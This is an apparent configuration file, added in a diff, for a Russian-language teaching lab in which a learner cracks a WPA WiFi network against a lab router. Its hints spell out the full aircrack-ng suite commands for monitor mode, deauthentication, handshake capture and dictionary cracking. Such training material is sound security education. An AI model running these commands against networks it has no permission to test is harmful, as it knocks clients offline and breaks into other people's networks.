@@ -1,0 +1,181 @@
+{
+  "target_bssid": "AA:BB:CC:DD:EE:FF",
+  "target_ssid": "SOCOL_TARGET",
+  "target_channel": "6",
+  "wordlist_path": "/home/kali/WiFiLab/server/wordlist.txt",
+  "capture_path": "/tmp/wifilab_capture",
+  "steps": [
+    {
+      "id": "welcome",
+      "order": 1,
+      "title": "Добро пожаловать",
+      "messages": [
+        "Привет! Добро пожаловать в WiFi Lab 🔓",
+        "Сегодня ты попробуешь себя в роли пентестера и взломаешь WiFi сеть.",
+        "Роутер перед тобой — твоя цель. Все действия легальны и контролируемы.",
+        "Готов? Нажми «Готово» чтобы начать!"
+      ],
+      "hints": [],
+      "validation": {
+        "type": "manual",
+        "pattern": null,
+        "timeout_sec": null
+      },
+      "on_success": null,
+      "show_capture": false
+    },
+    {
+      "id": "kill_processes",
+      "order": 2,
+      "title": "Убираем помехи",
+      "messages": [
+        "Перед началом нужно убить процессы, которые могут мешать работе WiFi-адаптера в режиме мониторинга.",
+        "Используй команду <code>airmon-ng</code> с параметрами <code>check kill</code> для этого."
+      ],
+      "hints": [
+        "Команда состоит из трёх слов: утилита + действие + подтверждение",
+        "Полная команда: <code>sudo airmon-ng check kill</code>"
+      ],
+      "validation": {
+        "type": "output_match",
+        "pattern": "(Killing these processes|No interfering processes)",
+        "timeout_sec": 120,
+        "source": "main"
+      },
+      "on_success": "Отлично! Мешающие процессы убиты. Теперь WiFi-адаптер свободен.",
+      "show_capture": false
+    },
+    {
+      "id": "monitor_mode",
+      "order": 3,
+      "title": "Режим мониторинга",
+      "messages": [
+        "Теперь нужно перевести WiFi-адаптер в режим мониторинга. Это позволит перехватывать все пакеты в эфире.",
+        "Используй <code>airmon-ng</code> с параметром <code>start</code> и именем интерфейса."
+      ],
+      "hints": [
+        "Сначала посмотри доступные интерфейсы: <code>iwconfig</code> или <code>airmon-ng</code>",
+        "Нужный интерфейс обычно называется <code>wlan0</code>",
+        "Полная команда: <code>sudo airmon-ng start wlan0</code>"
+      ],
+      "validation": {
+        "type": "output_match",
+        "pattern": "(wlan\\d+mon|monitor mode)",
+        "timeout_sec": 120,
+        "source": "main"
+      },
+      "on_success": "Видишь интерфейс в режиме мониторинга? Теперь мы можем слушать эфир!",
+      "show_capture": false
+    },
+    {
+      "id": "scan_networks",
+      "order": 4,
+      "title": "Сканирование сетей",
+      "messages": [
+        "Запусти сканирование всех WiFi сетей вокруг. Нам нужно найти нашу цель.",
+        "Используй <code>airodump-ng</code> с интерфейсом в режиме мониторинга.",
+        "Когда увидишь нашу целевую сеть — нажми <code>Ctrl+C</code> чтобы остановить сканирование и нажми «Готово»."
+      ],
+      "hints": [
+        "Интерфейс мониторинга обычно называется <code>wlan0mon</code>",
+        "Полная команда: <code>sudo airodump-ng wlan0mon</code>",
+        "Ищи сеть с именем <code>{target_ssid}</code>"
+      ],
+      "validation": {
+        "type": "output_match",
+        "pattern": "{target_bssid}",
+        "timeout_sec": 180,
+        "source": "main"
+      },
+      "on_success": "Нашли! Вижу целевую сеть. Запомни BSSID и канал — они нам понадобятся.",
+      "show_capture": false
+    },
+    {
+      "id": "target_capture",
+      "order": 5,
+      "title": "Прицельный захват",
+      "messages": [
+        "Сейчас я запущу прицельный захват пакетов целевой сети в отдельном окне внизу.",
+        "Ты увидишь монитор захвата — он будет записывать всё что происходит в целевой сети.",
+        "Переходи к следующему шагу — нажми «Готово»."
+      ],
+      "hints": [],
+      "validation": {
+        "type": "manual",
+        "pattern": null,
+        "timeout_sec": null
+      },
+      "on_success": "Монитор захвата запущен! Видишь окно внизу? Там airodump-ng записывает пакеты.",
+      "show_capture": true,
+      "capture_command": "sudo airodump-ng -c {target_channel} --bssid {target_bssid} -w {capture_path} wlan0mon"
+    },
+    {
+      "id": "deauth",
+      "order": 6,
+      "title": "Деаутентификация",
+      "messages": [
+        "Теперь нужно заставить клиента переподключиться к роутеру, чтобы перехватить handshake.",
+        "Для этого отправь пакеты деаутентификации с помощью <code>aireplay-ng</code>.",
+        "Используй флаг <code>-0</code> (deauth), количество пакетов, <code>-a</code> (BSSID роутера) и интерфейс мониторинга."
+      ],
+      "hints": [
+        "Флаг <code>-0 5</code> отправит 5 пакетов деаутентификации",
+        "Флаг <code>-a</code> указывает BSSID целевого роутера",
+        "Полная команда: <code>sudo aireplay-ng -0 5 -a {target_bssid} wlan0mon</code>"
+      ],
+      "validation": {
+        "type": "output_match",
+        "pattern": "(DeAuth|deauthentication|Sending 64 directed)",
+        "timeout_sec": 120,
+        "source": "main"
+      },
+      "on_success": "Деаутентификация отправлена! Смотри в монитор захвата — ждём handshake...",
+      "show_capture": true
+    },
+    {
+      "id": "handshake",
+      "order": 7,
+      "title": "Перехват рукопожатия",
+      "messages": [
+        "Смотри в монитор захвата внизу ↓",
+        "Когда клиент переподключится, в правом верхнем углу окна airodump-ng появится надпись <code>WPA handshake</code>.",
+        "Если не появилось — попробуй отправить деаутентификацию ещё раз (предыдущий шаг)."
+      ],
+      "hints": [
+        "Подожди 10-15 секунд после деаутентификации",
+        "Если handshake не появился — повтори: <code>sudo aireplay-ng -0 5 -a {target_bssid} wlan0mon</code>"
+      ],
+      "validation": {
+        "type": "output_match",
+        "pattern": "WPA handshake:\\s*{target_bssid}",
+        "timeout_sec": 300,
+        "source": "capture"
+      },
+      "on_success": "HANDSHAKE ПЕРЕХВАЧЕН! 🎉 Теперь у нас есть всё для взлома пароля!",
+      "show_capture": true
+    },
+    {
+      "id": "crack",
+      "order": 8,
+      "title": "Взлом пароля",
+      "messages": [
+        "Финальный шаг! Используй <code>aircrack-ng</code> чтобы подобрать пароль по словарю.",
+        "Нужно указать файл захвата (<code>-cap</code> файл) и словарь (<code>-w</code> путь к словарю).",
+        "Файл захвата: <code>{capture_path}-01.cap</code>",
+        "Словарь: <code>{wordlist_path}</code>"
+      ],
+      "hints": [
+        "Используй флаг <code>-w</code> для указания словаря и <code>-b</code> для BSSID",
+        "Полная команда: <code>sudo aircrack-ng -w {wordlist_path} -b {target_bssid} {capture_path}-01.cap</code>"
+      ],
+      "validation": {
+        "type": "output_match",
+        "pattern": "KEY FOUND!",
+        "timeout_sec": 120,
+        "source": "main"
+      },
+      "on_success": null,
+      "show_capture": false
+    }
+  ]
+}
